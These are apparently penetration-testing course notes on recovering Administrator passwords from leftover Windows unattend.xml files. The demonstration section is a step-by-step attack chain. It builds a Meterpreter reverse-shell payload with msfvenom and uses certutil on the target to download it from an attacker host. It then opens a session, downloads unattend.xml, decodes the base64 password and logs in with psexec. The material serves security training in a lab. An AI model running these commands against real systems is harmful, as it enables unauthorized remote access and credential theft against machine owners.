Windows Configuration Files
- Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
- This is typically done through the use of unattended Windows Setup utility which is used to automate the mass installation/deployment of Windows on systems.
- This tool uses configuration files that can contain specific configurations and user account credentials, specifically the Administrator's password.
- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows targets legitimately.

Unattended Windows Setup
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
	- C:\Windows\Panther\unattend.xml
	- C:\Windows\Panther\autounattend.xml
	- The files would be present either on the given paths, or in a subdirectory named Unattend in the C:\Windows\Panther folder.
- As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64

Practical Demonstration
- On the target system:
	- On a command prompt:
		- `net user`
		- `whoami /priv`
- On our Attack Machine:
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe`
- `python -m SimpleHTTPServer 80`
- On the target system:
	- On a command prompt:
		- `cd Desktop`
		- `certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe`
- On our Attack Machine:
	- `service postgresql start; msfconsole`
	- `use multi/handler`
	- `set payload windows/x64/meterpreter/reverse_tcp`
	- `set LPORT 1234`
	- `set LHOST 10.10.5.2`
- On the target system:
	- Execute payload.exe
- On our Attack Machine:
	- Meterpreter Session:
		- `sysinfo`
		- `search -f unattend.xml`
		- `cd C:\Windows\Panther`
		- `dir`
		- `download unattend.xml`
	- `cat unattend.xml`
	- Go through the unattend.xml file manually to find out the field with the password of the user account, and save it in a new file named password.txt.
	- `nano password.txt`
	- `base64 -d password.txt > decoded_password.txt`
	- Password verification using a PsExec login attempt:
		-  `psexec.py Administrator@demo.ine.local`
		- `whoami`
